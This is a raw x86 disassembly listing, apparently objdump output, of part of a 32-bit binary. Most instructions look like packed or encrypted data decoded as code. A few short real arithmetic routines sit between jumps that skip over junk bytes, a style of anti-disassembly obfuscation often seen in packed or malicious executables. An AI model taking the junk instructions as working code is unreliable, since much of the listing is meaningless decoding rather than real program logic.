  4090bf:	into   
  4090c0:	lock ror DWORD PTR [esi+ecx*4],0x74
  4090c5:	xor    dh,bh
  4090c7:	inc    eax
  4090c8:	sbb    eax,0x2b03f0ee
  4090cd:	mov    ds:0x3bea91e4,al
  4090d2:	lock mov DWORD PTR ds:0x42a821,0x7b75
  4090dd:	jne    0x4093c9
  4090e3:	jmp    0x4093a9
  4090e8:	retf   0xd0cb
  4090eb:	cmp    eax,0xcbd9d1d5
  4090f0:	mov    edx,0x1ba4c6c4
  4090f5:	js     0x4090d1
  4090f7:	call   0x7ea7:0x7878ef8e
  4090fe:	js     0x409178
  409100:	fbld   TBYTE PTR [ebx]
  409102:	mov    ch,ah
  409104:	loop   0x409179
  409106:	push   cs
  409107:	xchg   edi,eax
  409108:	test   al,0xd3
  40910a:	push   ds
  40910b:	inc    esp
  40910c:	sub    DWORD PTR [ebx+0x5537b641],esi
  409112:	data16 ror BYTE PTR [ebx+0x492c2d6b],1
  409119:	xor    eax,0xf9a09e3b
  40911e:	ss add bl,ah
  409121:	mov    esi,0x9d7cd758
  409126:	cmp    ebp,DWORD PTR [edx+0x0]
  409129:	mov    ds:0x920c5a52,al
  40912e:	xor    ecx,DWORD PTR [esi+eiz*8+0x25]
  409132:	clc    
  409133:	out    dx,al
  409134:	xor    eax,0x89ddf94d
  409139:	mov    ds:0xfaae7b92,al
  40913e:	sub    eax,ebp
  409140:	or     DWORD PTR [esi+0x58ba4311],ebp
  409146:	mov    esp,0xb0978d5a
  40914b:	dec    esi
  40914c:	cmp    al,0x56
  40914e:	dec    edx
  40914f:	jle    0x40914b
  409151:	push   0xb7e716d5
  409156:	in     al,0x33
  409158:	mov    BYTE PTR [eax+0x78],al
  40915b:	sub    eax,DWORD PTR [eax]
  40915d:	addr16 sub dl,cl
  409160:	mov    ch,0xb3
  409162:	sti    
  409163:	fbstp  TBYTE PTR [ecx]
  409165:	sub    eax,0x588f1dd4
  40916a:	ficom  WORD PTR [esi-0x79]
  40916d:	lea    ebx,ds:0x8eda1382
  409173:	cdq    
  409174:	dec    esp
  409175:	cmp    BYTE PTR [ebx+0x4f],dh
  409178:	or     edx,ebp
  40917a:	jmp    0x7b08:0xe347f4f7
  409181:	xor    eax,0xa8aa1c52
  409186:	xor    BYTE PTR [ebx],bl
  409188:	pop    ecx
  409189:	sub    BYTE PTR [esi+0x34],dl
  40918c:	add    eax,0x853bd33
  409191:	sbb    bh,ch
  409193:	dec    ebx
  409194:	adc    ebx,DWORD PTR [edi+edi*8-0x8c19c1a]
  40919b:	xor    edi,DWORD PTR [edi-0x71]
  40919e:	jns    0x409143
  4091a0:	sbb    bl,al
  4091a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091a4:	into   
  4091a5:	add    eax,0xed382d76
  4091aa:	push   0x2c
  4091ac:	jnp    0x40922c
  4091ae:	lds    ecx,FWORD PTR [edi]
  4091b0:	push   eax
  4091b1:	and    BYTE PTR [ecx+0x2b],dh
  4091b4:	mov    al,0x97
  4091b6:	sub    ebp,eax
  4091b8:	call   0xaf992784
  4091bd:	mov    eax,0x8b7a689d
  4091c2:	mov    cl,0xc1
  4091c4:	jmp    0x40917e
  4091c6:	jg     0x40915a
  4091c8:	test   BYTE PTR [edi-0x76],dl
  4091cb:	xchg   ecx,eax
  4091cc:	mov    dl,0xb
  4091ce:	cmp    eax,0x92c68936
  4091d3:	inc    ebp
  4091d4:	aaa    
  4091d5:	cld    
  4091d6:	inc    ecx
  4091d7:	lods   al,BYTE PTR ds:[esi]
  4091d8:	adc    al,0xc8
  4091da:	jns    0x40915d
  4091dc:	jne    0x4091de
  4091de:	sbb    BYTE PTR [edx+edx*1-0x56],al
  4091e2:	and    ah,BYTE PTR [ebp+0x75]
  4091e5:	lahf   
  4091e6:	xchg   BYTE PTR [ebp+0x7d],dl
  4091e9:	(bad)  
  4091ea:	push   0xffffffc8
  4091ec:	sub    esi,DWORD PTR [eax+0x29a84db]
  4091f2:	bound  edx,QWORD PTR [eax+0x36]
  4091f5:	add    BYTE PTR [ebp+0x36],0x51
  4091f9:	jp     0x409243
  4091fb:	ss jge 0x409197
  4091fe:	fsub   QWORD PTR [ecx+0x76018395]
  409204:	(bad)  
  409205:	ror    BYTE PTR es:[eax],cl
  409208:	dec    edi
  409209:	push   esp
  40920a:	push   ss
  40920b:	sysret 
  40920d:	lahf   
  40920e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40920f:	add    edx,DWORD PTR [esi+0x5b]
  409212:	and    ecx,ecx
  409214:	inc    ebp
  409215:	jne    0x4091aa
  409217:	and    DWORD PTR ds:0xa96e4a7d,0xffffffe6
  40921e:	dec    ecx
  40921f:	xor    eax,0x1673d11d
  409224:	jmp    0x3e4d:0x68ddbd0e
  40922b:	and    DWORD PTR [eax+eiz*4],ebx
  40922e:	mov    bl,0xd7
  409230:	mov    ds:0x4b42ffb8,eax
  409235:	(bad)  
  409236:	push   ecx
  409237:	pop    esi
  409238:	cmp    ah,BYTE PTR [ecx]
  40923a:	fidivr WORD PTR [edx+0x2f63c208]
  409240:	jmp    0x409206
  409242:	mov    ecx,0x7e6b8814
  409247:	dec    ecx
  409248:	push   0x64628742
  40924d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40924e:	inc    ebp
  40924f:	lea    esp,ds:0x2c4fb3d2
  409255:	stos   BYTE PTR es:[edi],al
  409256:	xor    dl,BYTE PTR [eax+0x4d500a83]
  40925c:	shr    DWORD PTR [ebx-0x35700293],0xcc
  409263:	pop    ebp
  409264:	xchg   ecx,eax
  409265:	aad    0x58
  409267:	test   BYTE PTR [ecx+ebx*8],dh
  40926a:	mov    dh,0x16
  40926c:	jne    0x409240
  40926e:	test   DWORD PTR [edx+ebp*1-0x3b],0x3227dace
  409276:	push   ebp
  409277:	push   eax
  409278:	jge    0x40925a
  40927a:	sub    bl,BYTE PTR [edi]
  40927c:	add    ebx,DWORD PTR [ebx-0x677198da]
  409282:	xlat   BYTE PTR ds:[ebx]
  409283:	fbld   TBYTE PTR [ecx]
  409285:	fsub   st,st(5)
  409287:	jecxz  0x409237
  409289:	cwde   
  40928a:	std    
  40928b:	scas   al,BYTE PTR es:[edi]
  40928c:	repz and eax,0x750db086
  409292:	inc    edx
  409293:	sbb    ecx,eax
  409295:	xor    al,0x1b
  409297:	and    al,0xa1
  409299:	inc    edi
  40929a:	or     BYTE PTR [esi+0x72],al
  40929d:	jae    0x4092f3
  40929f:	mov    ds,WORD PTR [ecx+0x10]
  4092a2:	bound  esi,QWORD PTR [edx+0x117f97d3]
  4092a8:	or     esi,DWORD PTR ds:[edx+0x3e41cff3]
  4092af:	xchg   esp,eax
  4092b0:	adc    BYTE PTR ds:0x634225da,ch
  4092b6:	dec    edx
  4092b7:	sub    DWORD PTR [edi-0x67],ecx
  4092ba:	xchg   edx,eax
  4092bb:	pop    ebx
  4092bc:	dec    eax
  4092bd:	out    dx,eax
  4092be:	dec    ebp
  4092bf:	gs es dec ecx
  4092c2:	add    BYTE PTR [edx+0x11],dh
  4092c5:	out    0x79,al
  4092c7:	test   DWORD PTR [edx-0x2ca25c0f],esi
  4092cd:	cwde   
  4092ce:	in     al,dx
  4092cf:	enter  0xe93c,0x1e
  4092d3:	lods   al,BYTE PTR ds:[esi]
  4092d4:	dec    ecx
  4092d5:	pop    ss
  4092d6:	pop    esi
  4092d7:	loop   0x40934e
  4092d9:	add    dl,BYTE PTR [eax]
  4092db:	sbb    DWORD PTR [edi+0x3],eax
  4092de:	xchg   esp,eax
  4092df:	jnp    0x409294
  4092e1:	test   al,0x29
  4092e3:	sbb    al,0xcd
  4092e5:	gs int 0x33
  4092e8:	cdq    
  4092e9:	mov    ds:0x9cb4016c,al
  4092ee:	sbb    ah,dl
  4092f0:	cs movs DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4092f3:	jge    0x4092d4
  4092f5:	cmp    cl,BYTE PTR [edi+ebx*2]
  4092f8:	inc    edi
  4092f9:	inc    ebx
  4092fa:	pop    ss
  4092fb:	std    
  4092fc:	enter  0x2d34,0xdd
  409300:	jmp    0x4092b0
  409302:	fisubr DWORD PTR [edi]
  409304:	inc    edx
  409305:	data16 sbb BYTE PTR [esi+edi*8-0x13],0x8b
  40930b:	mov    ah,0xd2
  40930d:	mov    ebp,0x614c3721
  409312:	ret    0x9ed8
  409315:	sahf   
  409316:	adc    al,0x21
  409318:	ficomp DWORD PTR [edx]
  40931a:	out    0x21,eax
  40931c:	inc    ebx
  40931d:	mov    dh,0xd4
  40931f:	sub    BYTE PTR [edx+0x1e3206ec],al
  409325:	xchg   edx,eax
  409326:	push   0x49
  409328:	xor    esp,DWORD PTR [eax-0x5d9dc71f]
  40932e:	fstp   DWORD PTR [edx+0x5a]
  409331:	outs   dx,BYTE PTR ds:[esi]
  409332:	mov    edi,esi
  409334:	mov    bh,0xe6
  409336:	pop    edi
  409337:	rol    BYTE PTR [ebx-0x50],1
  40933a:	mov    cl,0x1
  40933c:	mov    edi,edi
  40933e:	retf   0xba76
  409341:	xchg   DWORD PTR [edi],eax
  409343:	sub    BYTE PTR es:[esi-0x51],ah
  409347:	fdiv   DWORD PTR [ebx+0x1d7a805a]
  40934d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40934e:	adc    esi,edi
  409350:	lea    edi,[edx+0x9d10f8]
  409356:	sub    DWORD PTR [ecx-0x4bba140e],edx
  40935c:	imul   eax,DWORD PTR [edx-0x77831f05],0xffffff9f
  409363:	into   
  409364:	adc    dh,bh
  409366:	test   eax,0x463e801d
  40936b:	or     eax,0x74fb5593
  409370:	div    BYTE PTR [ecx+0x22edaf71]
  409376:	cmp    ch,0x9d
  409379:	hlt    
  40937a:	stos   DWORD PTR es:[edi],eax
  40937b:	pop    ebx
  40937c:	pop    ss
  40937d:	stc    
  40937e:	shl    DWORD PTR [ebp+0x1b26846],0x6c
  409385:	mov    WORD PTR [eax+0x40bed2f8],?
  40938b:	(bad)  
  40938c:	(bad)  
  40938d:	aad    0xc6
  40938f:	out    0x38,eax
  409391:	loope  0x409337
  409393:	lahf   
  409394:	pop    ecx
  409395:	pop    ebx
  409396:	scas   eax,DWORD PTR es:[edi]
  409397:	cmp    BYTE PTR [esp+ebx*1+0x1bd42705],dl
  40939e:	sub    BYTE PTR [ebx-0x2d1cb664],cl
  4093a4:	add    eax,DWORD PTR [ebp+0x61]
  4093a7:	enter  0x8bdd,0x45
  4093ab:	cld    
  4093ac:	add    DWORD PTR ds:0x42a7d9,0x42a789
  4093b6:	mov    esi,DWORD PTR [ebp-0x8]
  4093b9:	xor    eax,edx
  4093bb:	xor    esi,edx
  4093bd:	add    eax,ecx
  4093bf:	add    esi,ecx
  4093c1:	imul   eax,esi
  4093c4:	jmp    0x4096ca
  4093c9:	mov    eax,DWORD PTR [ebp+0xc]
  4093cc:	mov    eax,DWORD PTR [eax+0x78]
  4093cf:	mov    DWORD PTR [ebp+0xc],eax
  4093d2:	mov    eax,DWORD PTR [ebp-0x4]
  4093d5:	mov    esi,DWORD PTR [ebp-0x8]
  4093d8:	xor    eax,edx
  4093da:	xor    esi,edx
  4093dc:	add    eax,ecx
  4093de:	add    esi,ecx
  4093e0:	imul   eax,esi
  4093e3:	mov    esi,DWORD PTR [ebp+0xc]
  4093e6:	cmp    esi,eax
  4093e8:	jmp    0x4096ae
  4093ed:	xlat   BYTE PTR ds:[ebx]
  4093ee:	leave  
  4093ef:	retf   0xdad6
  4093f2:	aad    0xdb
  4093f4:	leave  
  4093f5:	adc    bl,BYTE PTR ds:0xdd41ff3d
  4093fb:	and    ch,BYTE PTR [edx+0x35]
  4093fe:	in     al,dx
  4093ff:	js     0x409479
  409401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409402:	jle    0x40947c
  409404:	js     0x4093a2
  409406:	jae    0x4093fc
  409408:	inc    esi
  409409:	add    DWORD PTR [ecx+0x34],esi
  40940c:	retf   0x7b28
  40940f:	nop
  409410:	popa   
  409411:	mov    esi,DWORD PTR ds:0xd98e0cc
  409417:	add    ah,BYTE PTR [edx-0x6d52a6b8]
  40941d:	or     ebx,esp
  40941f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409420:	(bad)  
  409421:	xlat   BYTE PTR ds:[ebx]
  409422:	xor    BYTE PTR [esi+0x9cf054a],cl
  409428:	jle    0x409468
  40942a:	sub    dl,ch
  40942c:	push   eax
  40942d:	inc    eax
  40942e:	ret    0xd33b
  409431:	mov    ch,0x9e
  409433:	repnz daa 
  409435:	mov    edx,0x8ca2e88d
  40943a:	scas   eax,DWORD PTR es:[edi]
  40943b:	mov    ds:0xd383b4e9,al
  409440:	lds    edx,FWORD PTR [edx+0x11]
  409443:	push   ebx
  409444:	add    eax,0x306bb96b
  409449:	not    BYTE PTR [eax+0x3697094e]
  40944f:	lods   eax,DWORD PTR ds:[esi]
  409450:	and    edi,esp
  409452:	(bad)  
  409454:	daa    
  409455:	adc    dh,BYTE PTR [eax]
  409457:	(bad)  
  409458:	mov    al,0xb6
  40945a:	popf   
  40945b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40945c:	xor    dh,BYTE PTR [esi]
  40945e:	out    0xce,eax
  409460:	enter  0x4b1b,0xd1
  409464:	not    BYTE PTR [ecx+0x2]
  409467:	mov    dh,0x53
  409469:	aas    
  40946a:	xchg   BYTE PTR [ecx-0x3d],dl
  40946d:	jmp    DWORD PTR ds:0xf773224e
  409473:	scas   al,BYTE PTR es:[edi]
  409474:	pop    edx
  409475:	inc    edi
  409476:	push   ebp
  409477:	loopne 0x409483
  409479:	pop    es
  40947a:	gs cld 
  40947c:	inc    ebp
  40947d:	push   0x39
  40947f:	std    
  409480:	mov    edi,0xc9abef69
  409485:	and    eax,0x9a6e98ba
  40948a:	sbb    ch,BYTE PTR [edx+0x701c41aa]
  409490:	(bad)  
  409491:	repnz adc dh,cl
  409494:	js     0x4094b7
  409496:	mov    ebp,0x6257d470
  40949b:	mov    BYTE PTR [eax+0x45],dh
  40949e:	inc    edx
  40949f:	push   ds
  4094a0:	sti    
  4094a1:	mov    WORD PTR [esi],gs
  4094a3:	push   ebx
  4094a4:	sbb    esp,DWORD PTR [ebx+edx*4-0x615def59]
  4094ab:	sub    al,BYTE PTR [edi+0x16f38135]
  4094b1:	and    DWORD PTR [ebx],eax
  4094b3:	mov    edx,0xf1aa4e52
  4094b8:	jle    0x409475
  4094ba:	in     eax,0xcc
  4094bc:	leave  
  4094bd:	mov    esi,0xca9d60f5
  4094c2:	jmp    0xb682:0xc2063f4
  4094c9:	popa   
  4094ca:	pop    esi
  4094cb:	je     0x4094c2
  4094cd:	xchg   ebx,eax
  4094ce:	stos   BYTE PTR es:[edi],al
  4094cf:	and    eax,ebp
  4094d1:	nop
  4094d2:	pop    ss
  4094d3:	xchg   esi,eax
  4094d4:	aad    0xc1
  4094d6:	push   ebx
  4094d7:	xor    ebx,esp
  4094d9:	xchg   ebx,eax
  4094da:	outs   dx,BYTE PTR ds:[esi]
  4094db:	xlat   BYTE PTR ds:[ebx]
  4094dc:	rcl    DWORD PTR [edi-0x38a606f0],cl
  4094e2:	ins    BYTE PTR es:[edi],dx
  4094e3:	(bad)  
  4094e4:	aam    0x53
  4094e6:	and    dl,BYTE PTR [edx]
  4094e8:	jl     0x409489
  4094ea:	sub    eax,0xa98e4305
  4094ef:	clc    
  4094f0:	pop    ds
  4094f1:	ja     0x409571
  4094f3:	fisubr DWORD PTR [ebx-0x36]
  4094f6:	ss push 0xffffffbc
  4094f9:	pop    ss
  4094fa:	(bad)  
  4094fb:	out    dx,al
  4094fc:	(bad)  
  4094fd:	icebp  
  4094fe:	push   edx
  4094ff:	mov    BYTE PTR [esi-0x4b8e9311],0x53
  409506:	int    0x49
  409508:	inc    ebp
  409509:	sahf   
  40950a:	outs   dx,DWORD PTR ds:[esi]
  40950b:	das    
  40950c:	sar    ah,1
  40950e:	push   ebp
  40950f:	push   cs
  409510:	imul   ebx,DWORD PTR [esi],0xb0ffdc9d
  409516:	ret    0x11b3
  409519:	jecxz  0x409546
  40951b:	popa   
  40951c:	cmp    BYTE PTR [esi+0x53],dh
  40951f:	cmp    BYTE PTR [ecx],ch
  409521:	dec    eax
  409522:	shl    DWORD PTR [ebx+0x60],cl
  409525:	je     0x409555
  409527:	push   ds
  409528:	cmp    BYTE PTR [esi],dh
  40952a:	das    
  40952b:	adc    eax,0xca39c8ed
  409530:	jle    0x4094b5
  409532:	stos   DWORD PTR es:[edi],eax
  409533:	sub    eax,0xd0b649dd
  409538:	es jmp 0xd0b9:0xc450012a
  409540:	mov    al,ds:0xe7cdf033
  409545:	aad    0xb1
  409547:	gs push 0x6d
  40954a:	push   ebp
  40954b:	mov    cl,0x21
  40954d:	les    esp,FWORD PTR [esi+edi*1]
  409550:	mul    DWORD PTR [edx+0x7c]
  409553:	xor    bl,bl
  409555:	rcl    BYTE PTR [ecx+0x41],0xf5
  409559:	mov    eax,ds:0xbcc60d1d
  40955e:	call   0x85e5ab47
  409563:	adc    eax,eax
  409565:	and    bl,BYTE PTR [ebx]
  409567:	xor    dl,cl
  409569:	out    0x30,al
  40956b:	pop    eax
  40956c:	inc    edi
  40956d:	das    
  40956e:	lock xchg ecx,eax
  409570:	fisttp QWORD PTR [edx-0x11]
  409573:	and    DWORD PTR [edi],esi
  409575:	jbe    0x409516
  409577:	mov    esp,0x25302931
  40957c:	push   ss
  40957d:	inc    eax
  40957e:	dec    esp
  40957f:	nop
  409580:	add    DWORD PTR [ebp+0x7d5c2723],0xffffff88
  409587:	xchg   edi,eax
  409588:	pop    es
  409589:	sbb    ah,ch
  40958b:	jno    0x40956f
  40958d:	dec    edx
  40958e:	jnp    0x4095f7
  409590:	aad    0xf2
  409592:	pushf  
  409593:	xor    BYTE PTR [edi],0xe7
  409596:	in     al,dx
  409597:	xchg   edi,eax
  409598:	or     eax,0x6e0f382
  40959d:	or     eax,0xc7b4a78
  4095a2:	xchg   edi,eax
  4095a3:	adc    eax,0xedf5d134
  4095a8:	stos   BYTE PTR es:[edi],al
  4095a9:	retf   
  4095aa:	and    DWORD PTR [ecx+0x51],0x3b289bf7
  4095b1:	ds inc eax
  4095b3:	mov    ds:0xa21896de,eax
  4095b8:	enter  0x568,0xb7
  4095bc:	pop    edx
  4095bd:	pop    ss
  4095be:	or     ah,ah
  4095c0:	dec    edx
  4095c1:	in     eax,dx
  4095c2:	sub    al,0x46
  4095c4:	and    BYTE PTR [ecx+0x7d5b0a27],ah
  4095ca:	dec    ecx
  4095cb:	push   ebx
  4095cc:	fldenv [ecx+0x1d4c137a]
  4095d2:	adc    ebp,DWORD PTR [edx+0x76]
  4095d5:	add    BYTE PTR [edx],0x79
  4095d8:	enter  0xae7c,0xd8
  4095dc:	pop    edx
  4095dd:	jb     0x4095ce
  4095df:	lock pop ebp
  4095e1:	fsub   QWORD PTR [esi+0x18]
  4095e4:	add    ah,dl
  4095e6:	test   dl,dl
  4095e8:	int3   
  4095e9:	adc    al,0x9
  4095eb:	sbb    DWORD PTR [edx+0x56],esp
  4095ee:	es ret 0xcc05
  4095f2:	mov    eax,0xa1a9696
  4095f7:	jo     0x409627
  4095f9:	mov    DWORD PTR [esi+eiz*1-0x74],esi
  4095fd:	(bad)  
  4095fe:	repz fadd DWORD PTR [eax-0x14b1270d]
  409605:	and    BYTE PTR [edx-0xee7c084],cl
  40960b:	inc    esp
  40960c:	or     eax,0x9b2ce519
  409611:	push   edi
  409612:	mov    esi,0xfb37c7fa
  409617:	add    al,0x7e
  409619:	popf   
  40961a:	cmc    
  40961b:	cwde   
  40961c:	cdq    
  40961d:	test   BYTE PTR [esi+esi*2],ch
  409620:	std    
  409621:	sti    
  409622:	cs xchg esp,eax
  409624:	mov    ds,esi
  409626:	dec    ebp
  409627:	jne    0x4095e0
  409629:	jbe    0x409679
  40962b:	sub    BYTE PTR [esp+edx*8-0x22],ch
  40962f:	shl    DWORD PTR [esi],cl
  409631:	pop    ebp
  409632:	clc    
  409633:	fistp  WORD PTR [eax+0x23]
  409636:	xor    ebp,ebx
  409638:	cmc    
  409639:	mov    ?,WORD PTR [ebp+0x32]
  40963c:	cli    
  40963d:	mov    ah,0xe8
  40963f:	ror    ecx,0xbd
  409642:	fldcw  WORD PTR [edi+0x1c]
  409645:	and    bl,cl
  409647:	ror    ch,cl
  409649:	hlt    
  40964a:	adc    esp,DWORD PTR [edx+eiz*8]
  40964d:	mov    ds:0xe37bc9a8,al
  409652:	dec    edx
  409653:	pop    ebx
  409654:	sbb    BYTE PTR [eax+0x43],0xa8
  409658:	inc    edi
  409659:	dec    edi
  40965a:	test   BYTE PTR [ebp-0x2fe5812],cl
  409660:	stos   BYTE PTR es:[edi],al
  409661:	pop    esi
  409662:	int    0x96
  409664:	js     0x4096a8
  409666:	inc    edx
  409667:	inc    ecx
  409668:	xlat   BYTE PTR ds:[ebx]
  409669:	neg    DWORD PTR [ecx-0x29012820]
  40966f:	daa    
  409670:	xchg   DWORD PTR [eax-0x7deb6dd1],esi
  409676:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  409678:	sub    eax,0xc0e871ac
  40967d:	xchg   ebp,eax
  40967e:	mov    esp,0x1a52fd35
  409683:	jecxz  0x409649
  409685:	imul   edi,DWORD PTR [ecx+0x67693125],0xf44f6dd6
  40968f:	in     al,dx
  409690:	cdq    
  409691:	ins    BYTE PTR es:[edi],dx
  409692:	push   ss
  409693:	stc    
  409694:	les    ecx,FWORD PTR [ecx-0x367d7c2b]
  40969a:	ins    BYTE PTR es:[edi],dx
  40969b:	(bad)  
  40969d:	dec    esp
  40969e:	sub    ecx,DWORD PTR [esi+edi*1-0x7c1ae4fb]
  4096a5:	cmp    edx,ecx
  4096a7:	sbb    al,0xae
  4096a9:	add    dh,al
  4096ab:	or     BYTE PTR [ebx-0x67],ch
  4096ae:	mov    eax,DWORD PTR [ebp-0x4]
  4096b1:	je     0x4093ac
  4096b7:	xor    eax,edx
  4096b9:	add    eax,ecx
  4096bb:	mov    ecx,DWORD PTR [ebp+0xc]
  4096be:	imul   eax,ecx
  4096c1:	add    eax,DWORD PTR [ebp+0x8]
  4096c4:	mov    DWORD PTR [ebp+0xc],eax
  4096c7:	mov    eax,DWORD PTR [ebp+0xc]
  4096ca:	pop    esi
  4096cb:	leave  
  4096cc:	ret    0x8
  4096cf:	push   ebp
  4096d0:	mov    ebp,esp
  4096d2:	jmp    0x4099c5
  4096d7:	leave  
  4096d8:	enter  0x3ed6,0xd9
  4096dc:	(bad)  
  4096dd:	(bad)  
  4096df:	xlat   BYTE PTR ds:[ebx]
  4096e0:	enter  0xc218,0xcc
  4096e4:	stos   DWORD PTR es:[edi],eax
  4096e5:	in     al,0x82
  4096e7:	pop    esp
  4096e8:	bnd js 0x409763
  4096eb:	push   edx
  4096ec:	jle    0x409766
  4096ee:	js     0x40967f
  4096f0:	mov    dl,0xfb
  4096f2:	cmp    al,0x71
  4096f4:	(bad)
  4096f7:	stos   BYTE PTR es:[edi],al
  4096f8:	mov    cl,0x15
  4096fa:	sar    DWORD PTR [ecx-0x16e7e055],0x30
  409701:	mov    al,ds:0x7c3affb7
  409706:	iret   
  409707:	jmp    0x755d6bf
  40970c:	adc    bl,BYTE PTR [ebx]
  40970e:	out    dx,al
  40970f:	into   
  409710:	jg     0x4096e6
  409712:	loop   0x409704
  409714:	mov    bh,0x14
  409716:	jmp    0x4096da
  409718:	add    BYTE PTR [ebp-0x62],dh
  40971b:	mul    BYTE PTR [edx+eax*2-0xc]
  40971f:	not    edi
  409721:	adc    DWORD PTR [ebx+0x3c],0xc2f355b0
  409728:	jg     0x4096b7
  40972a:	(bad)  
  40972b:	cmp    al,0xd6
  40972d:	pop    ebp
  40972e:	mov    cs,WORD PTR [edi+edx*4]
  409731:	lock sahf 
  409733:	fadd   DWORD PTR [esi]
  409735:	adc    DWORD PTR [esi+eax*4],ebp
  409738:	or     BYTE PTR [ebp+0x52641af6],0xd2
  40973f:	dec    esp
  409740:	int3   
  409741:	push   edx
  409742:	sbb    DWORD PTR [ebp*4+0x45fbbdcd],esi
  409749:	arpl   WORD PTR [ecx+0x2f],di
  40974c:	enter  0x8fa6,0x33
  409750:	push   ebp
  409751:	mov    ch,0xbc
  409753:	call   0xd051e5e9
  409758:	addr16 test al,0xfa
  40975b:	or     cl,dh
  40975d:	add    eax,0xbdac2571
  409762:	out    0x23,eax
  409764:	push   es
  409765:	loopne 0x4097d2
  409767:	and    DWORD PTR [edi],ebx
  409769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40976a:	leave  
  40976b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40976c:	fdivr  DWORD PTR [ecx]
  40976e:	xchg   ch,bl
  409770:	push   esi
  409771:	imul   ecx
  409773:	or     DWORD PTR [edi-0x15ad8726],edi
  409779:	inc    ebx
  40977a:	fdiv   DWORD PTR [ecx-0x39]
  40977d:	xchg   esi,eax
  40977e:	pop    ss
  40977f:	or     al,0x73
  409781:	mov    edx,0x40f8a831
  409786:	mov    al,ds:0xd927537c
  40978b:	(bad)  
  40978c:	pop    edi
  40978d:	cld    
  40978e:	cs out 0x41,eax
  409791:	add    cl,ch
  409793:	hlt    
  409794:	xchg   edi,eax
  409795:	int3   
  409796:	and    esp,ebx
  409798:	shl    BYTE PTR [esi],0x35
  40979b:	or     DWORD PTR [esi+ebp*8+0x8c28cf1],0x78
  4097a3:	addr16 std 
  4097a5:	outs   dx,BYTE PTR ds:[esi]
  4097a6:	cmp    eax,0xb4cc682c
  4097ab:	sbb    BYTE PTR [esi+0x37],bl
  4097ae:	mov    eax,ds:0x378bd789
  4097b3:	mov    dh,0x73
  4097b5:	jne    0x40982a
  4097b7:	xchg   edx,eax
  4097b8:	(bad)  
  4097b9:	push   esi
  4097ba:	sub    BYTE PTR [ebx-0x62],dl
  4097bd:	retf   0x3d9e
  4097c0:	(bad)  
  4097c1:	mov    ebp,0xafc360ca
  4097c6:	sbb    dl,BYTE PTR gs:[eax+0x59]
  4097ca:	popf   
  4097cb:	inc    ecx
  4097cc:	xor    eax,0x2d460f2e
  4097d1:	loope  0x40981c
  4097d3:	in     eax,0xe9
  4097d5:	or     eax,0x885a7b08
  4097da:	mov    bl,0x74
  4097dc:	bound  eax,QWORD PTR [ebp+0x731328a7]
  4097e2:	add    al,0xaa
  4097e4:	push   ss
  4097e5:	or     eax,0xbdcf4c25
  4097ea:	sbb    BYTE PTR [edi+esi*4],dh
  4097ed:	inc    edx
  4097ee:	(bad)  
  4097ef:	sbb    al,0x9
  4097f1:	fstp   st(7)
  4097f3:	sub    esp,esp
  4097f5:	cmp    eax,DWORD PTR [esi]
  4097f7:	fwait
  4097f8:	dec    ecx
  4097f9:	inc    eax
  4097fa:	out    0x2e,eax
  4097fc:	or     BYTE PTR [edi+eiz*8],dh
  4097ff:	pop    eax
  409800:	call   0xb403e02b
  409805:	mov    ebp,0x926bb5e2
  40980a:	jl     0x409847
  40980c:	push   ds
  40980d:	and    bl,BYTE PTR [edx+0x31]
  409810:	ss in  eax,dx
  409812:	out    dx,al
  409813:	popf   
  409814:	xchg   ebx,eax
  409815:	dec    ecx
  409816:	mov    ebp,0xafe0bf1f
  40981b:	aad    0xcf
  40981d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40981e:	pop    es
  40981f:	popa   
  409820:	outs   dx,DWORD PTR ds:[esi]
  409821:	adc    BYTE PTR [esp+ecx*8],ah
  409824:	daa    
  409825:	popf   
  409826:	mov    esi,0xcfb75e3a
  40982b:	xchg   BYTE PTR [ebx+ebx*2],bl
  40982e:	pop    esi
  40982f:	test   al,0xd9
  409831:	popa   
  409832:	jmp    0x3cd4:0x94136a1
  409839:	mov    DWORD PTR [edx],0x7f2af325
  40983f:	add    dl,BYTE PTR ds:0x6c79ff58
  409845:	xchg   DWORD PTR [ecx-0x4c6bb1e7],esi
  40984b:	mov    ecx,0x5377374c
  409850:	sbb    BYTE PTR [edi-0x4b],bh
  409853:	(bad)  
  409854:	ret    
  409855:	pop    esi
  409856:	fild   QWORD PTR [eax+ecx*2+0x7d2ca1eb]
  40985d:	push   es
  40985e:	test   DWORD PTR [eax],ebp
  409860:	scas   al,BYTE PTR es:[edi]
  409861:	xor    esp,edi
  409863:	lods   eax,DWORD PTR ds:[esi]
  409864:	test   al,0x14
  409866:	jae    0x40985b
  409868:	in     eax,0x49
  40986a:	(bad)  
  40986b:	fistp  WORD PTR [edx-0x1c511477]
  409871:	outs   dx,DWORD PTR ds:[esi]
  409872:	mov    eax,ds:0xa5593f61
  409877:	xor    al,0x61
  409879:	rcr    BYTE PTR [ebp-0x760f9505],cl
  40987f:	jo     0x4098ff
  409881:	dec    edx
  409882:	mov    eax,0xf51f2306
  409887:	ins    BYTE PTR es:[edi],dx
  409888:	ret    0xfa15
  40988b:	jp     0x40985f
  40988d:	jae    0x40983a
  40988f:	(bad)  
  409890:	(bad)  
  409891:	iret   
  409892:	pop    ds
  409893:	mov    ds:0xcc9f3b79,al
  409898:	and    eax,0xe043dd8a
  40989d:	in     al,dx
  40989e:	out    0x7d,al
  4098a0:	mov    eax,ds:0xe29d2953
  4098a5:	ins    DWORD PTR es:[edi],dx
  4098a6:	jno    0x40990e
  4098a8:	retf   
  4098a9:	and    eax,0x79798aac
  4098ae:	dec    ebp
  4098af:	jg     0x4098eb
  4098b1:	add    al,0x4e
  4098b3:	dec    edi
  4098b4:	xchg   ebx,eax
  4098b5:	or     ebp,DWORD PTR [edi]
  4098b7:	pop    esi
  4098b8:	sahf   
  4098b9:	clc    
